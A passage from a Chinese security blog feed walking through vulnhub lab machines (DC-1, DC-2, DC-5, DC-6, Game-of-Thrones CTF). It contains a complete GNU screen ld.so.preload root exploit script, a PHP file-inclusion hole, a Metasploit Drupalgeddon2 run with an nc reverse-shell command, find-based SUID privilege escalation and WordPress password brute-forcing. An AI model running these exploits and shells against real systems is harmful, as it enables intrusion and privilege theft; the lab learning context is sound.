local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"~ gnu/screenroot ~"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] First, we create our shell and library..."</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, 04755);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Now we create our /etc/ld.so.preload file..."</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure></p><h3>DC5后记</h3><p>thankyou.php文件中有以下内容；典型的本地文件包含漏洞<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class="footer-wrapper"&gt;</span><br><span class="line">&lt;footer&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"$file"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"footer.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/footer&gt;</span><br></pre></td></tr></table></figure></p><h2>DC1</h2><p>arp-scan发现主机</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [9:46:49] </span><br><span class="line">$ arp-scan 192.168.41.0/24</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.41.100:50:56:c0:00:08VMware, Inc.</span><br><span class="line">192.168.41.200:50:56:e0:f7:aaVMware, Inc.</span><br><span class="line">192.168.41.16800:0c:29:9f:4c:60VMware, Inc. ---&gt; DC1靶机</span><br><span class="line">192.168.41.25400:50:56:f5:fb:f6VMware, Inc.</span><br></pre></td></tr></table></figure></p><p>扫描端口</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [9:46:56] </span><br><span class="line">$ masscan -p0-65535 192.168.41.168 --rate=1000000</span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 13:47:23 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65536 ports/host]</span><br><span class="line">Discovered open port 111/tcp on 192.168.41.168                                 </span><br><span class="line">Discovered open port 47738/tcp on 192.168.41.168                               </span><br><span class="line">Discovered open port 22/tcp on 192.168.41.168                                  </span><br><span class="line">Discovered open port 80/tcp on 192.168.41.168</span><br></pre></td></tr></table></figure></p><p>发现80端口是一个cms，名字叫drupal</p><p>metasploit搜索一下drupal的渗透模块</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search drupal</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                           Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   1  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection</span><br><span class="line">   2  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration</span><br><span class="line">   3  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection</span><br><span class="line">   4  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution</span><br><span class="line">   5  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br></pre></td></tr></table></figure></p><p>然后设置相关参数，获得shell</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOSTS 192.168.41.168</span><br><span class="line">RHOSTS =&gt; 192.168.41.168</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.41.165:4444 </span><br><span class="line">[*] Sending stage (38247 bytes) to 192.168.41.168</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.41.165:4444 -&gt; 192.168.41.168:41848) at 2019-08-09 09:48:32 -0400</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">100644/rw-r--r--  174    fil   2013-11-20 15:45:59 -0500  .gitignore</span><br><span class="line">100644/rw-r--r--  5767   fil   2013-11-20 15:45:59 -0500  .htaccess</span><br></pre></td></tr></table></figure></p><p>但是之后只能获得一个<code>Meterpreter</code>,不是root用户也没法运行Linux的常用命令，于是想到修改payload</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set payload php/exec</span><br><span class="line">payload =&gt; php/exec</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set CMD nc 192.168.41.165 2333 -c /bin/bash</span><br><span class="line">CMD =&gt; nc 192.168.41.165 2333 -c /bin/bash</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</span><br></pre></td></tr></table></figure></p><p>此时本机监听一个2333端口，成功反弹shell</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp 2333           </span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">192.168.41.168: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.41.165] from (UNKNOWN) [192.168.41.168] 60424</span><br><span class="line">ls</span><br><span class="line">COPYRIGHT.txt</span><br><span class="line">INSTALL.mysql.txt</span><br><span class="line">INSTALL.pgsql.txt</span><br><span class="line">INSTALL.sqlite.txt</span><br></pre></td></tr></table></figure></p><p>此时上提权辅助脚本：</p><p><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></p><p>添加可执行权限并且运行，重点关注：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[-] SUID files:</span><br><span class="line">-rwsr-xr-x 1 root root 88744 Dec 10  2012 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 31104 Apr 13  2011 /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 35200 Feb 27  2017 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 35252 Apr 13  2011 /bin/ping6</span><br><span class="line">-rwsr-xr-x 1 root root 67704 Dec 10  2012 /bin/umount</span><br><span class="line">-rwsr-sr-x 1 daemon daemon 50652 Oct  4  2014 /usr/bin/at</span><br><span class="line">-rwsr-xr-x 1 root root 35892 Feb 27  2017 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 45396 Feb 27  2017 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 30880 Feb 27  2017 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 44564 Feb 27  2017 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 66196 Feb 27  2017 /usr/bin/gpasswd</span><br><span class="line">-rwsr-sr-x 1 root mail 83912 Nov 18  2017 /usr/bin/procmail</span><br><span class="line">-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</span><br><span class="line">-rwsr-xr-x 1 root root 937564 Feb 11  2018 /usr/sbin/exim4</span><br><span class="line">-rwsr-xr-x 1 root root 9660 Jun 20  2017 /usr/lib/pt_chown</span><br><span class="line">-rwsr-xr-x 1 root root 248036 Jan 27  2018 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 5412 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-- 1 root messagebus 321692 Feb 10  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 84532 May 22  2013 /sbin/mount.nfs</span><br></pre></td></tr></table></figure></p><p>但是此时并没有什么用，我们这里要讲的是用fing命令提权</p><p><a href="https://www.cnblogs.com/aaronax/p/5618024.html" target="_blank" rel="noopener">find 之exec</a></p><p>随便创建一个文件<code>touch anquanke</code>然后find查找并且加上-exec选项：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find anquanke -exec &apos;whoami&apos; \;</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p><p>发现此时是root用户，于是执行/bin/sh</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find anquanke -exec &apos;/bin/sh&apos; \;</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p><p>至此提权成功了</p><h2>DC-6靶机——wordpress渗透</h2><p>老规矩探测靶机的ip，然后扫描端口发现开放了80，按照下载时作者的提示需要修改hosts文件</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/hosts</span><br><span class="line">127.0.0.1localhost</span><br><span class="line">127.0.1.1kali</span><br><span class="line">192.168.41.129  wordy</span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure></p><p>之前kali上的<code>wpscan</code>有问题，更新镜像源重新升级了一下</p><p><code>wpscan --url http://wordy/ -e -t 20</code> 直接扫一下看能有什么结果</p><p>扫描到用户：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Detected By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] mark</span><br><span class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] sarah</span><br><span class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jens</span><br><span class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] graham</span><br><span class="line"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure></p><p>下一步根据上面下载地址处作者的提示，我们生产一个字典包</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [21:29:41] </span><br><span class="line">$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure></p><p>之后使用wpscan爆破密码，登陆后台开始提权</p><h2>参考</h2><p><a href="https://xz.aliyun.com/t/2549#toc-4" target="_blank" rel="noopener">Linux 反弹shell（二）反弹shell的本质</a></p><p><a href="https://www.anquanke.com/post/id/173111#h3-3" target="_blank" rel="noopener">渗透测试实战-DC-1:1靶机入侵+Matrix2靶机入侵</a></p><p><a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94DC-5+DC-6%E9%9D%B6%E6%9C%BA%E5%85%A5%E4%BE%B5">渗透测试实战——DC-5+DC-6靶机入侵</a></p><p><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" target="_blank" rel="noopener">Linux提权辅助脚本</a></p><h2>Game-of-Thrones-CTF-1靶机复现</h2><p>一个很有意思的靶机</p><p>扫描靶机ip地址</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [19:58:22] </span><br><span class="line">$ arp-scan 192.168.19.0/24</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.19.200:50:56:f9:02:e9VMware, Inc.</span><br><span class="line">192.168.19.13100:0c:29:d0:e7:e1VMware, Inc. ---&gt; 靶机</span><br><span class="line">192.168.19.25400:50:56:e8:10:0eVMware, Inc.</span><br></pre></td></tr></table></figure></p><p>扫描端口</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [19:59:38] </span><br><span class="line">$ masscan -p0-65535 192.168.19.131  --rate=1000000</span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-10 23:59:47 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65536 ports/host]</span><br><span class="line">Discovered open port 80/tcp on 192.168.19.131                                  </span><br><span class="line">Discovered open port 21/tcp on 192.168.19.131                                  </span><br><span class="line">Discovered open port 1337/tcp on 192.168.19.131                                </span><br><span class="line">Discovered open port 10000/tcp on 192.168.19.131                               </span><br><span class="line">Discovered open port 53/tcp on 192.168.19.131                                  </span><br><span class="line">Discovered open port 22/tcp on 192.168.19.131                                  </span><br><span class="line">Discovered open port 5432/tcp on 192.168.19.131</span><br></pre></td></tr></table></figure></p><p>扫描端口对应的服务：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [20:00:24] </span><br><span class="line">$ nmap -sV -T4 192.168.19.131           </span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-10 20:02 EDT</span><br><span class="line">Stats: 0:01:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 83.33% done; ETC: 20:04 (0:00:19 remaining)</span><br><span class="line">Nmap scan report for 192.168.19.131</span><br><span class="line">Host is up (0.000085s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORT      STATE    SERVICE    VERSION</span><br><span class="line">21/tcp    open     ftp?</span><br><span class="line">22/tcp    open     ssh        Linksys WRT45G modified dropbear sshd (protocol 2.0)</span><br><span class="line">53/tcp    open     domain     (unknown banner: Bind)</span><br><span class="line">80/tcp    open     http       Apache httpd</span><br><span class="line">143/tcp   filtered imap</span><br><span class="line">3306/tcp  filtered mysql</span><br><span class="line">5432/tcp  open     postgresql PostgreSQL DB 9.6.4 - 9.6.6</span><br><span class="line">10000/tcp open     http       MiniServ 1.590 (Webmin httpd)</span><br><span class="line">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port21-TCP:V=7.70%I=7%D=8/10%Time=5D4F5B1F%P=x86_64-pc-linux-gnu%r(Gene</span><br><span class="line">SF:ricLines,11C,&quot;220-------------------------\r\n220-\&quot;These\x20are\x20the</span><br><span class="line">SF:\x20Dorne\x20city\x20walls\.\x20We\x20must\x20enter!\&quot;\x20-\x20Grey\x20</span><br><span class="line">SF:Worm\r\n220-\r\n220-\&quot;A\x20fail2ban\x20spell\x20is\x20protecting\x20the</span><br><span class="line">SF:se\x20walls\.\x20You&apos;ll\x20never\x20get\x20in\&quot;\x20-\x20One\x20of\x20th</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>此时80端口是开放的，所以可以扫描一下目录：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[20:04:36] 200 -    1KB - /favicon.ico</span><br><span class="line">[20:04:37] 301 -  232B  - /h  -&gt;  http://192.168.19.131/h/</span><br><span class="line">[20:04:37] 200 -    3KB - /index.php/login/</span><br><span class="line">[20:04:37] 200 -    3KB - /index.php</span><br><span class="line">[20:04:37] 301 -  233B  - /js  -&gt;  http://192.168.19.131/js/</span><br><span class="line">[20:04:38] 301 -  236B  - /music  -&gt;  http://192.168.19.131/music/</span><br><span class="line">[20:04:40] 200 -  135B  - /robots.txt</span><br><span class="line">[20:04:40] 403 -  222B  - /server-status</span><br><span class="line">[20:04:40] 403 -  223B  - /server-status/</span><br></pre></td></tr></table></figure></p><p>robots.txt文件</p><p>依次访问这些页面，同时记得查看源代码，具体的分析之后再搞<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> /the-tree/</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /secret-island/</span><br><span class="line">Disallow: /direct-access-to-kings-landing/</span><br></pre></td></tr></table></figure></p><h3>参考</h3><p><a href="https://www.freebuf.com/articles/web/177562.html" target="_blank" rel="noopener">Game-of-Thrones-CTF-1靶机完全攻略</a></p><h2>DC-2靶机</h2><p>同样的扫描靶机ip，然后扫描端口，之后扫描端口对应的服务</p><p>发现开放了80和7744端口</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~/dirsearch on git:master o [20:46:10] </span><br><span class="line">$ nmap -sV -p80,7744 192.168.19.132</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-10 20:47 EDT</span><br><span class="line">Nmap scan report for 192.168.19.132</span><br><span class="line">Host is up (0.00046s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">MAC Address: 00:0C:29:6A:1A:54 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds</span><br></pre></td></tr></table></figure></p><p>然后修改hosts文件，打开网址发现又是一个wordpress</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc2-0.png" alt=""></p><p>flag页面提示用cewl命令生成一个字典</p><p><code>cewl -w dc2_passwords.txt http://dc-2</code></p><p>用<code>wpscan</code>扫描出用户名，然后再用<code>wpscan</code>爆破密码</p><p><code>wpscan --url http://dc-2/ -e -t 20</code></p><p><code>wpscan --url http://dc-2/ -U user.txt -P dc2_passwords.txt</code></p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[i] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;DC 5&lt;/h2&gt;
&lt;p&gt;之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;spa
      
    
    </summary>
    
      <category term="vulstudy" scheme="https://prontosil.club/categories/vulstudy/"/>
    
    
      <category term="靶机" scheme="https://prontosil.club/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="nmap" scheme="https://prontosil.club/tags/nmap/"/>
    
      <category term="提权" scheme="https://prontosil.club/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="masscan" scheme="https://prontosil.club/tags/masscan/"/>
    
      <category term="find" scheme="https://prontosil.club/tags/find/"/>
    
  </entry>
  
  <entry>
    <title>typhoon靶机渗透</title>
    <link href="https://prontosil.club/2019/08/09/typhoon%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>https://prontosil.club/2019/08/09/typhoon靶机渗透/</id>
    <published>2019-08-08T23:30:37.000Z</published>
    <updated>2019-08-13T01:54:23.223Z</updated>
    
    <content type="html"><![CDATA[<p>昨天晚上实战了一把，遇到了很多师傅，也积累了一些刷靶机的经验，虽然Windows那台靶机不知道是怎么回事，但是Linux那台还是玩的比较爽的。</p><p>今天又重新从 https://vulnhub.com 上把靶机搞下来装到Vmware上自己实验</p><p>靶机渗透之前也玩过，但是我每次发现自己都无法找到靶机的ip地址，这次重新实验了一下可以使用<code>arp-scan</code>和<code>masscan</code>工具</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [3:04:28] C:1</span><br><span class="line">$ arp-scan 192.168.41.0/24</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.41.100:50:56:c0:00:08VMware, Inc.</span><br><span class="line">192.168.41.200:50:56:e0:f7:aaVMware, Inc.</span><br><span class="line">192.168.41.16600:0c:29:d7:ef:a4VMware, Inc.</span><br><span class="line">192.168.41.25400:50:56:f5:fb:f6VMware, Inc.</span><br><span class="line"></span><br><span class="line">62 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.5: 256 hosts scanned in 7.212 seconds (35.50 hosts/sec). 4 